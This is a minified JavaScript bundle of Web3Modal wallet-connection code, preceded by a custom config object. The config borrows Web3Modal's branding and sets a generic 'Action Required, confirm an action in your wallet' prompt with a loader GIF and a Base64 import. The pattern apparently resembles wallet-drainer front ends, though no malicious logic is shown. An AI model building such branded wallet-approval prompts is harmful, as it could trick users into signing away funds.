window.themeMode = "dark";

let cfg = {
  domain: 'https://web3modal.com',
  description: 'Web3Modal',
  name: 'Web3Modal',
  icon: 'https://avatars.githubusercontent.com/u/37784886',
  headerText:"Action Required",
  middleHeaderText:"Confirm in wallet",
  text:"In order to continue you need to confirm an action in your wallet.",
  loaderImg:"https://i.gifer.com/ZKZg.gif"
}
import{Base64 as dB}from"https://cdn.jsdelivr.net/npm/js-base64@3.7.2/base64.mjs";!function(){const e=document.createElement("link").relList;if(!(e&&e.supports&&e.supports("modulepreload"))){for(const e of document.querySelectorAll('link[rel="modulepreload"]'))t(e);new MutationObserver((e=>{for(const r of e)if("childList"===r.type)for(const e of r.addedNodes)"LINK"===e.tagName&&"modulepreload"===e.rel&&t(e)})).observe(document,{childList:!0,subtree:!0})}function t(e){if(e.ep)return;e.ep=!0;const t=function(e){const t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),"use-credentials"===e.crossOrigin?t.credentials="include":"anonymous"===e.crossOrigin?t.credentials="omit":t.credentials="same-origin",t}(e);fetch(e.href,t)}}();const pB=Symbol(),k6=Object.getPrototypeOf,Qy=new WeakMap,gB=e=>e&&(Qy.has(e)?Qy.get(e):k6(e)===Object.prototype||k6(e)===Array.prototype),vB=e=>gB(e)&&e[pB]||null,D6=(e,t=!0)=>{Qy.set(e,t)},aw=e=>"object"==typeof e&&null!==e,Sl=new WeakMap,bd=new WeakSet,mB=(e=Object.is,t=((e,t)=>new Proxy(e,t)),r=(e=>aw(e)&&!bd.has(e)&&(Array.isArray(e)||!(Symbol.iterator in e))&&!(e instanceof WeakMap)&&!(e instanceof WeakSet)&&!(e instanceof Error)&&!(e instanceof Number)&&!(e instanceof Date)&&!(e instanceof String)&&!(e instanceof RegExp)&&!(e instanceof ArrayBuffer)),n=(e=>{switch(e.status){case"fulfilled":return e.value;case"rejected":throw e.reason;default:throw e}}),i=new WeakMap,o=((e,t,r=n)=>{const s=i.get(e);if((null==s?void 0:s[0])===t)return s[1];const a=Array.isArray(e)?[]:Object.create(Object.getPrototypeOf(e));return D6(a,!0),i.set(e,[t,a]),Reflect.ownKeys(e).forEach((t=>{if(Object.getOwnPropertyDescriptor(a,t))return;const n=Reflect.get(e,t),i={value:n,enumerable:!0,configurable:!0};if(bd.has(n))D6(n,!1);else if(n instanceof Promise)delete i.value,i.get=()=>r(n);else if(Sl.has(n)){const[e,t]=Sl.get(n);i.value=o(e,t(),r)}Object.defineProperty(a,t,i)})),Object.preventExtensions(a)}),s=new WeakMap,a=[1,1],c=(n=>{if(!aw(n))throw new Error("object required");const i=s.get(n);if(i)return i;let l=a[0];const u=new Set,h=(e,t=++a[0])=>{l!==t&&(l=t,u.forEach((r=>r(e,t))))};let d=a[1];const f=e=>(t,r)=>{const n=[...t];n[1]=[e,...n[1]],h(n,r)},p=new Map,g=e=>{var t;const r=p.get(e);r&&(p.delete(e),null==(t=r[1])||t.call(r))},m=Array.isArray(n)?[]:Object.create(Object.getPrototypeOf(n)),v=t(m,{deleteProperty(e,t){const r=Reflect.get(e,t);g(t);const n=Reflect.deleteProperty(e,t);return n&&h(["delete",[t],r]),n},set(t,n,i,o){const a=Reflect.has(t,n),l=Reflect.get(t,n,o);if(a&&(e(l,i)||s.has(i)&&e(l,s.get(i))))return!0;g(n),aw(i)&&(i=vB(i)||i);let d=i;if(i instanceof Promise)i.then((e=>{i.status="fulfilled",i.value=e,h(["resolve",[n],e])})).catch((e=>{i.status="rejected",i.reason=e,h(["reject",[n],e])}));else{!Sl.has(i)&&r(i)&&(d=c(i));const e=!bd.has(d)&&Sl.get(d);e&&((e,t)=>{if(u.size){const r=t[3](f(e));p.set(e,[t,r])}else p.set(e,[t])})(n,e)}return Reflect.set(t,n,d,o),h(["set",[n],i,l]),!0}});s.set(n,v);const y=[m,(e=++a[1])=>(d!==e&&!u.size&&(d=e,p.forEach((([t])=>{const r=t[1](e);r>l&&(l=r)}))),l),o,e=>(u.add(e),1===u.size&&p.forEach((([e,t],r)=>{const n=e[3](f(r));p.set(r,[e,n])})),()=>{u.delete(e),0===u.size&&p.forEach((([e,t],r)=>{t&&(t(),p.set(r,[e]))}))})];return Sl.set(v,y),Reflect.ownKeys(n).forEach((e=>{const t=Object.getOwnPropertyDescriptor(n,e);"value"in t&&(v[e]=n[e],delete t.value,delete t.writable),Object.defineProperty(m,e,t)})),v}))=>[c,Sl,bd,e,t,r,n,i,o,s,a],[bB]=mB();function qi(e={}){return bB(e)}function eu(e,t,r){const n=Sl.get(e);let i;const o=[],s=n[3];let a=!1;const c=s((e=>{o.push(e),r?t(o.splice(0)):i||(i=Promise.resolve().then((()=>{i=void 0,a&&t(o.splice(0))})))}));return a=!0,()=>{a=!1,c()}}function qd(e){return bd.add(e),e}function yo(e,t,r,n){let i=e[t];return eu(e,(()=>{const n=e[t];Object.is(i,n)||r(i=n)}),n)}var Ue=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function tu(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function sa(e){if(e.__esModule)return e;var t=e.default;if("function"==typeof t){var r=function e(){return this instanceof e?Reflect.construct(t,arguments,this.constructor):t.apply(this,arguments)};r.prototype=t.prototype}else r={};return Object.defineProperty(r,"__esModule",{value:!0}),Object.keys(e).forEach((function(t){var n=Object.getOwnPropertyDescriptor(e,t);Object.defineProperty(r,t,n.get?n:{enumerable:!0,get:function(){return e[t]}})})),r}const wd={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,ONE_SEC_MS:1e3,RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"]},pt={isMobile:()=>typeof window<"u"&&!(!window.matchMedia("(pointer:coarse)").matches&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)),isAndroid(){const e=navigator.userAgent.toLowerCase();return pt.isMobile()&&e.includes("android")},isIos(){const e=navigator.userAgent.toLowerCase();return pt.isMobile()&&(e.includes("iphone")||e.includes("ipad"))},isClient:()=>typeof window<"u",isPairingExpired:e=>!e||e-Date.now()<=wd.TEN_SEC_MS,isAllowedRetry:e=>Date.now()-e>=wd.ONE_SEC_MS,copyToClopboard(e){navigator.clipboard.writeText(e)},getPairingExpiry:()=>Date.now()+wd.FOUR_MINUTES_MS,getPlainAddress:e=>e.split(":")[2],wait:async e=>new Promise((t=>{setTimeout(t,e)})),debounce(e,t=500){let r;return(...n)=>{r&&clearTimeout(r),r=setTimeout((function(){e(...n)}),t)}},isHttpUrl:e=>e.startsWith("http://")||e.startsWith("https://"),formatNativeUrl(e,t){if(pt.isHttpUrl(e))return this.formatUniversalUrl(e,t);let r=e;r.includes("://")||(r=e.replaceAll("/","").replaceAll(":",""),r=`${r}://`),r.endsWith("/")||(r=`${r}/`);return{redirect:`${r}wc?uri=${encodeURIComponent(t)}`,href:r}},formatUniversalUrl(e,t){if(!pt.isHttpUrl(e))return this.formatNativeUrl(e,t);let r=e;r.endsWith("/")||(r=`${r}/`);return{redirect:`${r}wc?uri=${encodeURIComponent(t)}`,href:r}},openHref(e,t){window.open(e,t,"noreferrer noopener")},async preloadImage(e){const t=new Promise(((t,r)=>{const n=new Image;n.onload=t,n.onerror=r,n.crossOrigin="anonymous",n.src=e}));return Promise.race([t,pt.wait(2e3)])},formatBalance(e,t){var r;let n;if("0"===e)n="0.000";else if("string"==typeof e){const t=Number(e);t&&(n=null==(r=t.toString().match(/^-?\d+(?:\.\d{0,3})?/u))?void 0:r[0])}return n?`${n} ${t}`:"0.000"},isRestrictedRegion(){try{const{timeZone:e}=(new Intl.DateTimeFormat).resolvedOptions(),t=e.toUpperCase();return wd.RESTRICTED_TIMEZONES.includes(t)}catch{return!1}},getApiUrl:()=>pt.isRestrictedRegion()?"https://api.web3modal.org":"https://api.web3modal.com",getBlockchainApiUrl:()=>pt.isRestrictedRegion()?"https://rpc.walletconnect.org":"https://rpc.walletconnect.com",getAnalyticsUrl:()=>pt.isRestrictedRegion()?"https://pulse.walletconnect.org":"https://pulse.walletconnect.com",getUUID:()=>null!=crypto&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,(e=>{const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))},ln=qi({isConnected:!1}),Rr={state:ln,subscribe:e=>eu(ln,(()=>e(ln))),subscribeKey:(e,t)=>yo(ln,e,t),setIsConnected(e){ln.isConnected=e},setCaipAddress(e){ln.caipAddress=e,ln.address=e?pt.getPlainAddress(e):void 0},setBalance(e,t){ln.balance=e,ln.balanceSymbol=t},setProfileName(e){ln.profileName=e},setProfileImage(e){ln.profileImage=e},setAddressExplorerUrl(e){ln.addressExplorerUrl=e},resetAccount(){ln.isConnected=!1,ln.caipAddress=void 0,ln.address=void 0,ln.balance=void 0,ln.balanceSymbol=void 0,ln.profileName=void 0,ln.profileImage=void 0,ln.addressExplorerUrl=void 0}};class w3{constructor({baseUrl:e}){this.baseUrl=e}async get({headers:e,...t}){const r=this.createUrl(t);return(await fetch(r,{method:"GET",headers:e})).json()}async getBlob({headers:e,...t}){const r=this.createUrl(t);return(await fetch(r,{method:"GET",headers:e})).blob()}async post({body:e,headers:t,...r}){const n=this.createUrl(r);return(await fetch(n,{method:"POST",headers:t,body:e?JSON.stringify(e):void 0})).json()}async put({body:e,headers:t,...r}){const n=this.createUrl(r);return(await fetch(n,{method:"PUT",headers:t,body:e?JSON.stringify(e):void 0})).json()}async delete({body:e,headers:t,...r}){const n=this.createUrl(r);return(await fetch(n,{method:"DELETE",headers:t,body:e?JSON.stringify(e):void 0})).json()}createUrl({path:e,params:t}){const r=new URL(e,this.baseUrl);return t&&Object.entries(t).forEach((([e,t])=>{t&&r.searchParams.append(e,t)})),r}}const cw="WALLETCONNECT_DEEPLINK_CHOICE",$6="@w3m/recent",L6="@w3m/connected_wallet_image_url",Ms={setWalletConnectDeepLink({href:e,name:t}){try{localStorage.setItem(cw,JSON.stringify({href:e,name:t}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const e=localStorage.getItem(cw);if(e)return JSON.parse(e)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{localStorage.removeItem(cw)}catch{console.info("Unable to delete WalletConnect deep link")}},setWeb3ModalRecent(e){try{const t=Ms.getRecentWallets();t.find((t=>t.id===e.id))||(t.unshift(e),t.length>2&&t.pop(),localStorage.setItem($6,JSON.stringify(t)))}catch{console.info("Unable to set Web3Modal recent")}},getRecentWallets(){try{const e=localStorage.getItem($6);return e?JSON.parse(e):[]}catch{console.info("Unable to get Web3Modal recent")}return[]},setConnectedWalletImageUrl(e){try{localStorage.setItem(L6,e)}catch{console.info("Unable to set Connected Wallet Image Url")}},getConnectedWalletImageUrl(){try{return localStorage.getItem(L6)}catch{console.info("Unable to set Connected Wallet Image Url")}}},lc=qi({walletImages:{},networkImages:{},connectorImages:{},tokenImages:{}}),Cc={state:lc,subscribeNetworkImages:e=>eu(lc.networkImages,(()=>e(lc.networkImages))),subscribeKey:(e,t)=>yo(lc,e,t),setWalletImage(e,t){lc.walletImages[e]=t},setNetworkImage(e,t){lc.networkImages[e]=t},setConnectorImage(e,t){lc.connectorImages[e]=t},setTokenImage(e,t){lc.tokenImages[e]=t}},Kh=qi({connectors:[]}),ks={state:Kh,subscribeKey:(e,t)=>yo(Kh,e,t),setConnectors(e){Kh.connectors=e.map((e=>qd(e)))},addConnector(e){Kh.connectors.push(qd(e))},getConnectors:()=>Kh.connectors},Jh=qi({open:!1,selectedNetworkId:void 0}),yf={state:Jh,subscribe:e=>eu(Jh,(()=>e(Jh))),set(e){Object.assign(Jh,{...Jh,...e})}},Yn=qi({supportsAllNetworks:!0,isDefaultCaipNetwork:!1}),Fr={state:Yn,subscribeKey:(e,t)=>yo(Yn,e,t),_getClient(){if(!Yn._client)throw new Error("NetworkController client not set");return Yn._client},setClient(e){Yn._client=qd(e)},setCaipNetwork(e){Yn.caipNetwork=e,yf.set({selectedNetworkId:null==e?void 0:e.id})},setDefaultCaipNetwork(e){Yn.caipNetwork=e,yf.set({selectedNetworkId:null==e?void 0:e.id}),Yn.isDefaultCaipNetwork=!0},setRequestedCaipNetworks(e){Yn.requestedCaipNetworks=e},async getApprovedCaipNetworksData(){const e=await this._getClient().getApprovedCaipNetworksData();Yn.supportsAllNetworks=e.supportsAllNetworks,Yn.approvedCaipNetworkIds=e.approvedCaipNetworkIds},async switchActiveNetwork(e){await this._getClient().switchCaipNetwork(e),Yn.caipNetwork=e},resetNetwork(){Yn.isDefaultCaipNetwork||(Yn.caipNetwork=void 0),Yn.approvedCaipNetworkIds=void 0,Yn.supportsAllNetworks=!0}},es=qi({projectId:"",sdkType:"w3m",sdkVersion:"html-wagmi-undefined"}),_r={state:es,subscribeKey:(e,t)=>yo(es,e,t),setProjectId(e){es.projectId=e},setIncludeWalletIds(e){es.includeWalletIds=e},setExcludeWalletIds(e){es.excludeWalletIds=e},setFeaturedWalletIds(e){es.featuredWalletIds=e},setTokens(e){es.tokens=e},setTermsConditionsUrl(e){es.termsConditionsUrl=e},setPrivacyPolicyUrl(e){es.privacyPolicyUrl=e},setCustomWallets(e){es.customWallets=e},setEnableAnalytics(e){es.enableAnalytics=e},setSdkVersion(e){es.sdkVersion=e},setMetadata(e){es.metadata=e}},wB=pt.getApiUrl(),Ro=new w3({baseUrl:wB}),yB="40",B6="4",di=qi({page:1,count:0,featured:[],recommended:[],wallets:[],search:[]}),rr={state:di,subscribeKey:(e,t)=>yo(di,e,t),_getApiHeaders(){const{projectId:e,sdkType:t,sdkVersion:r}=_r.state;return{"x-project-id":e,"x-sdk-type":t,"x-sdk-version":r}},async _fetchWalletImage(e){const t=`${Ro.baseUrl}/getWalletImage/${e}`,r=await Ro.getBlob({path:t,headers:rr._getApiHeaders()});Cc.setWalletImage(e,URL.createObjectURL(r))},async _fetchNetworkImage(e){const t=`${Ro.baseUrl}/public/getAssetImage/${e}`,r=await Ro.getBlob({path:t,headers:rr._getApiHeaders()});Cc.setNetworkImage(e,URL.createObjectURL(r))},async _fetchConnectorImage(e){const t=`${Ro.baseUrl}/public/getAssetImage/${e}`,r=await Ro.getBlob({path:t,headers:rr._getApiHeaders()});Cc.setConnectorImage(e,URL.createObjectURL(r))},async fetchNetworkImages(){const{requestedCaipNetworks:e}=Fr.state,t=null==e?void 0:e.map((({imageId:e})=>e)).filter(Boolean);t&&await Promise.allSettled(t.map((e=>rr._fetchNetworkImage(e))))},async fetchConnectorImages(){const{connectors:e}=ks.state,t=e.map((({imageId:e})=>e)).filter(Boolean);await Promise.allSettled(t.map((e=>rr._fetchConnectorImage(e))))},async fetchFeaturedWallets(){const{featuredWalletIds:e}=_r.state;if(null!=e&&e.length){const{data:t}=await Ro.get({path:"/getWallets",headers:rr._getApiHeaders(),params:{page:"1",entries:null!=e&&e.length?String(e.length):B6,include:null==e?void 0:e.join(",")}});t.sort(((t,r)=>e.indexOf(t.id)-e.indexOf(r.id)));const r=t.map((e=>e.image_id)).filter(Boolean);await Promise.allSettled(r.map((e=>rr._fetchWalletImage(e)))),di.featured=t}},async fetchRecommendedWallets(){const{includeWalletIds:e,excludeWalletIds:t,featuredWalletIds:r}=_r.state,n=[...t??[],...r??[]].filter(Boolean),{data:i,count:o}=await Ro.get({path:"/getWallets",headers:rr._getApiHeaders(),params:{page:"1",entries:B6,include:null==e?void 0:e.join(","),exclude:null==n?void 0:n.join(",")}}),s=Ms.getRecentWallets(),a=i.map((e=>e.image_id)).filter(Boolean),c=s.map((e=>e.image_id)).filter(Boolean);await Promise.allSettled([...a,...c].map((e=>rr._fetchWalletImage(e)))),di.recommended=i,di.count=o??0},async fetchWallets({page:e}){const{includeWalletIds:t,excludeWalletIds:r,featuredWalletIds:n}=_r.state,i=[...di.recommended.map((({id:e})=>e)),...r??[],...n??[]].filter(Boolean),{data:o,count:s}=await Ro.get({path:"/getWallets",headers:rr._getApiHeaders(),params:{page:String(e),entries:yB,include:null==t?void 0:t.join(","),exclude:i.join(",")}}),a=o.map((e=>e.image_id)).filter(Boolean);await Promise.allSettled([...a.map((e=>rr._fetchWalletImage(e))),pt.wait(300)]),di.wallets=[...di.wallets,...o],di.count=s>di.count?s:di.count,di.page=e},async searchWallet({search:e}){const{includeWalletIds:t,excludeWalletIds:r}=_r.state;di.search=[];const{data:n}=await Ro.get({path:"/getWallets",headers:rr._getApiHeaders(),params:{page:"1",entries:"100",search:e,include:null==t?void 0:t.join(","),exclude:null==r?void 0:r.join(",")}}),i=n.map((e=>e.image_id)).filter(Boolean);await Promise.allSettled([...i.map((e=>rr._fetchWalletImage(e))),pt.wait(300)]),di.search=n},prefetch(){di.prefetchPromise=Promise.race([Promise.allSettled([rr.fetchFeaturedWallets(),rr.fetchRecommendedWallets(),rr.fetchNetworkImages(),rr.fetchConnectorImages()]),pt.wait(3e3)])}},_B=pt.getAnalyticsUrl(),EB=new w3({baseUrl:_B}),xB=["MODAL_CREATED"],Bu=qi({timestamp:Date.now(),data:{type:"track",event:"MODAL_CREATED"}}),kr={state:Bu,subscribe:e=>eu(Bu,(()=>e(Bu))),_getApiHeaders(){const{projectId:e,sdkType:t,sdkVersion:r}=_r.state;return{"x-project-id":e,"x-sdk-type":t,"x-sdk-version":r}},async _sendAnalyticsEvent(e){try{if(xB.includes(e.data.event)||typeof window>"u")return;await EB.post({path:"/e",headers:kr._getApiHeaders(),body:{eventId:pt.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:e.timestamp,props:e.data}})}catch{}},sendEvent(e){Bu.timestamp=Date.now(),Bu.data=e,_r.state.enableAnalytics&&kr._sendAnalyticsEvent(Bu)}},Dn=qi({view:"Connect",history:["Connect"]}),Ft={state:Dn,subscribeKey:(e,t)=>yo(Dn,e,t),push(e,t){e!==Dn.view&&(Dn.view=e,Dn.history.push(e),Dn.data=t)},reset(e){Dn.view=e,Dn.history=[e]},replace(e){Dn.history.length>1&&Dn.history.at(-1)!==e&&(Dn.view=e,Dn.history[Dn.history.length-1]=e)},goBack(){if(Dn.history.length>1){Dn.history.pop();const[e]=Dn.history.slice(-1);e&&(Dn.view=e)}}},g1=qi({open:!1}),On={state:g1,subscribeKey:(e,t)=>yo(g1,e,t),async open(e){await rr.state.prefetchPromise,null!=e&&e.view?Ft.reset(e.view):Rr.state.isConnected?Ft.reset("Account"):Ft.reset("Connect"),g1.open=!0,yf.set({open:!0}),kr.sendEvent({type:"track",event:"MODAL_OPEN"})},close(){g1.open=!1,yf.set({open:!1}),kr.sendEvent({type:"track",event:"MODAL_CLOSE"})}},xn=qi({wcError:!1,buffering:!1}),vr={state:xn,subscribeKey:(e,t)=>yo(xn,e,t),_getClient(){if(!xn._client)throw new Error("ConnectionController client not set");return xn._client},setClient(e){xn._client=qd(e)},connectWalletConnect(){xn.wcPromise=this._getClient().connectWalletConnect((e=>{xn.wcUri=e,xn.wcPairingExpiry=pt.getPairingExpiry()}))},async connectExternal(e){var t,r;await(null==(r=(t=this._getClient()).connectExternal)?void 0:r.call(t,e))},checkInstalled(e){var t,r;return null==(r=(t=this._getClient()).checkInstalled)?void 0:r.call(t,e)},resetWcConnection(){xn.wcUri=void 0,xn.wcPairingExpiry=void 0,xn.wcPromise=void 0,xn.wcLinking=void 0,xn.recentWallet=void 0,Ms.deleteWalletConnectDeepLink()},setWcLinking(e){xn.wcLinking=e},setWcError(e){xn.wcError=e,xn.buffering=!1},setRecentWallet(e){xn.recentWallet=e},setBuffering(e){xn.buffering=e},async disconnect(){await this._getClient().disconnect(),this.resetWcConnection()}},_a=qi({message:"",variant:"success",open:!1}),po={state:_a,subscribeKey:(e,t)=>yo(_a,e,t),showSuccess(e){_a.message=e,_a.variant="success",_a.open=!0},showError(e){_a.message=e,_a.variant="error",_a.open=!0},hide(){_a.open=!1}},Fu=qi({themeMode:"dark",themeVariables:{}}),Ts={state:Fu,subscribe:e=>eu(Fu,(()=>e(Fu))),setThemeMode(e){Fu.themeMode=e},setThemeVariables(e){Fu.themeVariables={...Fu.themeVariables,...e}}},SB=pt.getBlockchainApiUrl(),CB=new w3({baseUrl:SB}),AB={fetchIdentity:({caipChainId:e,address:t})=>CB.get({path:`/v1/identity/${t}`,params:{chainId:e,projectId:_r.state.projectId}})},wn={getWalletImage:e=>null!=e&&e.image_url?null==e?void 0:e.image_url:null!=e&&e.image_id?Cc.state.walletImages[e.image_id]:void 0,getNetworkImage:e=>null!=e&&e.imageUrl?null==e?void 0:e.imageUrl:null!=e&&e.imageId?Cc.state.networkImages[e.imageId]:void 0,getConnectorImage:e=>null!=e&&e.imageUrl?e.imageUrl:null!=e&&e.imageId?Cc.state.connectorImages[e.imageId]:void 0},V1=globalThis,y3=V1.ShadowRoot&&(void 0===V1.ShadyCSS||V1.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,_3=Symbol(),F6=new WeakMap;
/**
 * @license
 * Copyright 2019 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */let _A=class{constructor(e,t,r){if(this._$cssResult$=!0,r!==_3)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=t}get styleSheet(){let e=this.o;const t=this.t;if(y3&&void 0===e){const r=void 0!==t&&1===t.length;r&&(e=F6.get(t)),void 0===e&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),r&&F6.set(t,e))}return e}toString(){return this.cssText}};const ko=e=>new _A("string"==typeof e?e:e+"",void 0,_3),Qe=(e,...t)=>{const r=1===e.length?e[0]:t.reduce(((t,r,n)=>t+(e=>{if(!0===e._$cssResult$)return e.cssText;if("number"==typeof e)return e;throw Error("Value passed to 'css' function must be a 'css' function result: "+e+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(r)+e[n+1]),e[0]);return new _A(r,e,_3)},IB=(e,t)=>{if(y3)e.adoptedStyleSheets=t.map((e=>e instanceof CSSStyleSheet?e:e.styleSheet));else for(const r of t){const t=document.createElement("style"),n=V1.litNonce;void 0!==n&&t.setAttribute("nonce",n),t.textContent=r.cssText,e.appendChild(t)}},j6=y3?e=>e:e=>e instanceof CSSStyleSheet?(e=>{let t="";for(const r of e.cssRules)t+=r.cssText;return ko(t)})(e):e
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */,{is:RB,defineProperty:TB,getOwnPropertyDescriptor:NB,getOwnPropertyNames:OB,getOwnPropertySymbols:PB,getPrototypeOf:MB}=Object,Ac=globalThis,U6=Ac.trustedTypes,kB=U6?U6.emptyScript:"",lw=Ac.reactiveElementPolyfillSupport,Ad=(e,t)=>e,dg={toAttribute(e,t){switch(t){case Boolean:e=e?kB:null;break;case Object:case Array:e=null==e?e:JSON.stringify(e)}return e},fromAttribute(e,t){let r=e;switch(t){case Boolean:r=null!==e;break;case Number:r=null===e?null:Number(e);break;case Object:case Array:try{r=JSON.parse(e)}catch{r=null}}return r}},E3=(e,t)=>!RB(e,t),W6={attribute:!0,type:String,converter:dg,reflect:!1,hasChanged:E3};Symbol.metadata??(Symbol.metadata=Symbol("metadata")),Ac.litPropertyMetadata??(Ac.litPropertyMetadata=new WeakMap);let Zu=class extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??(this.l=[])).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,t=W6){if(t.state&&(t.attribute=!1),this._$Ei(),this.elementProperties.set(e,t),!t.noAccessor){const r=Symbol(),n=this.getPropertyDescriptor(e,r,t);void 0!==n&&TB(this.prototype,e,n)}}static getPropertyDescriptor(e,t,r){const{get:n,set:i}=NB(this.prototype,e)??{get(){return this[t]},set(e){this[t]=e}};return{get(){return null==n?void 0:n.call(this)},set(t){const o=null==n?void 0:n.call(this);i.call(this,t),this.requestUpdate(e,o,r)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??W6}static _$Ei(){if(this.hasOwnProperty(Ad("elementProperties")))return;const e=MB(this);e.finalize(),void 0!==e.l&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(Ad("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(Ad("properties"))){const e=this.properties,t=[...OB(e),...PB(e)];for(const r of t)this.createProperty(r,e[r])}const e=this[Symbol.metadata];if(null!==e){const t=litPropertyMetadata.get(e);if(void 0!==t)for(const[e,r]of t)this.elementProperties.set(e,r)}this._$Eh=new Map;for(const[e,t]of this.elementProperties){const r=this._$Eu(e,t);void 0!==r&&this._$Eh.set(r,e)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const t=[];if(Array.isArray(e)){const r=new Set(e.flat(1/0).reverse());for(const e of r)t.unshift(j6(e))}else void 0!==e&&t.push(j6(e));return t}static _$Eu(e,t){const r=t.attribute;return!1===r?void 0:"string"==typeof r?r:"string"==typeof e?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){var e;this._$Eg=new Promise((e=>this.enableUpdating=e)),this._$AL=new Map,this._$E_(),this.requestUpdate(),null==(e=this.constructor.l)||e.forEach((e=>e(this)))}addController(e){var t;(this._$ES??(this._$ES=[])).push(e),void 0!==this.renderRoot&&this.isConnected&&(null==(t=e.hostConnected)||t.call(e))}removeController(e){var t;null==(t=this._$ES)||t.splice(this._$ES.indexOf(e)>>>0,1)}_$E_(){const e=new Map,t=this.constructor.elementProperties;for(const r of t.keys())this.hasOwnProperty(r)&&(e.set(r,this[r]),delete this[r]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return IB(e,this.constructor.elementStyles),e}connectedCallback(){var e;this.renderRoot??(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),null==(e=this._$ES)||e.forEach((e=>{var t;return null==(t=e.hostConnected)?void 0:t.call(e)}))}enableUpdating(e){}disconnectedCallback(){var e;null==(e=this._$ES)||e.forEach((e=>{var t;return null==(t=e.hostDisconnected)?void 0:t.call(e)}))}attributeChangedCallback(e,t,r){this._$AK(e,r)}_$EO(e,t){var r;const n=this.constructor.elementProperties.get(e),i=this.constructor._$Eu(e,n);if(void 0!==i&&!0===n.reflect){const o=(void 0!==(null==(r=n.converter)?void 0:r.toAttribute)?n.converter:dg).toAttribute(t,n.type);this._$Em=e,null==o?this.removeAttribute(i):this.setAttribute(i,o),this._$Em=null}}_$AK(e,t){var r;const n=this.constructor,i=n._$Eh.get(e);if(void 0!==i&&this._$Em!==i){const e=n.getPropertyOptions(i),o="function"==typeof e.converter?{fromAttribute:e.converter}:void 0!==(null==(r=e.converter)?void 0:r.fromAttribute)?e.converter:dg;this._$Em=i,this[i]=o.fromAttribute(t,e.type),this._$Em=null}}requestUpdate(e,t,r,n=!1,i){if(void 0!==e){if(r??(r=this.constructor.getPropertyOptions(e)),!(r.hasChanged??E3)(n?i:this[e],t))return;this.C(e,t,r)}!1===this.isUpdatePending&&(this._$Eg=this._$EP())}C(e,t,r){this._$AL.has(e)||this._$AL.set(e,t),!0===r.reflect&&this._$Em!==e&&(this._$Ej??(this._$Ej=new Set)).add(e)}async _$EP(){this.isUpdatePending=!0;try{await this._$Eg}catch(e){Promise.reject(e)}const e=this.scheduleUpdate();return null!=e&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var e;if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this._$Ep){for(const[e,t]of this._$Ep)this[e]=t;this._$Ep=void 0}const e=this.constructor.elementProperties;if(e.size>0)for(const[t,r]of e)!0!==r.wrapped||this._$AL.has(t)||void 0===this[t]||this.C(t,this[t],r)}let t=!1;const r=this._$AL;try{t=this.shouldUpdate(r),t?(this.willUpdate(r),null==(e=this._$ES)||e.forEach((e=>{var t;return null==(t=e.hostUpdate)?void 0:t.call(e)})),this.update(r)):this._$ET()}catch(e){throw t=!1,this._$ET(),e}t&&this._$AE(r)}willUpdate(e){}_$AE(e){var t;null==(t=this._$ES)||t.forEach((e=>{var t;return null==(t=e.hostUpdated)?void 0:t.call(e)})),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$ET(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$Eg}shouldUpdate(e){return!0}update(e){this._$Ej&&(this._$Ej=this._$Ej.forEach((e=>this._$EO(e,this[e])))),this._$ET()}updated(e){}firstUpdated(e){}};Zu.elementStyles=[],Zu.shadowRootOptions={mode:"open"},Zu[Ad("elementProperties")]=new Map,Zu[Ad("finalized")]=new Map,null==lw||lw({ReactiveElement:Zu}),(Ac.reactiveElementVersions??(Ac.reactiveElementVersions=[])).push("2.0.1");
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */
